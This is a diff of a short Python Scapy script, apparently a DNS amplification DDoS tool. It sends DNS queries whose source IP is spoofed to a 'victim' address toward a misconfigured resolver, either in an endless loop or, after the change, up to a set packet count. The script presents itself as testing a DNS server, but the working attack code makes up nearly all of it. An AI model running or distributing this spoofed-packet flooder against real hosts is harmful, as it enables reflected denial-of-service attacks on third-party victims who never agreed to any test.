@@ -10,16 +10,15 @@ from scapy.all import *
 # Maybe get a cheap throwaway domain and add your own A records.
 names = ['irc.efnet.net', 'irc.dal.net', 'irc.undernet.org', 'irc.freenode.net']
 
-interface = get_working_if()
+iface = get_working_if()
 
 parser = argparse.ArgumentParser(add_help=True,
     description='Test your DNS server against amplification DDoS Attack')
 
-parser.add_argument('-i', default=interface,
-                          help=f"interface name ({interface})")
-
-parser.add_argument('-v', help='the IP address of the victim')
-parser.add_argument('-t', help='the IP address of the misconfigured DNS')
+parser.add_argument('-i', help='interface name', default=iface)
+parser.add_argument('-v', help='IP address of the victim')
+parser.add_argument('-t', help='IP address of the misconfigured DNS')
+parser.add_argument('-c', help='count of packets to sent')
 
 args = parser.parse_args()
 
@@ -38,7 +37,10 @@ if not args.t:
 pkt = IP(dst=args.t,src=args.v)/UDP(dport=53)/DNS(rd=1,
         qd=DNSQR(qname=choice(names)))
 
-send(pkt, loop=1, iface=args.i, verbose=1)
+if args.c:
+    send(pkt, count=int(args.c), iface=args.i, verbose=1)
+else:
+    send(pkt, loop=1, iface=args.i, verbose=1)
 
 # vim:sw=4:ts=4:sts=4:et:cc=80
 # End of file
